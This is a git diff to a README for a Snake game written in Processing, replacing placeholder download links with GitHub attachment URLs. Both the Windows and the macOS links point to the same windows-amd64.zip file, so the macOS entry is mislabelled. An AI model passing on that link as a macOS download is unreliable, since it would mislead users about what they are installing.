@@ -27,8 +27,8 @@ The Snake Game is a classic arcade game where the player controls a snake that m
 
 ## Download Release Version
 
-- [Download for Windows](#) 
-- [Download for macOS](#) 
+- [Download for Windows](https://github.com/mohnish-sharma/processing-snake-game/files/14194700/windows-amd64.zip) 
+- [Download for macOS](https://github.com/mohnish-sharma/processing-snake-game/files/14194700/windows-amd64.zip) 
 
 ## Installation
 
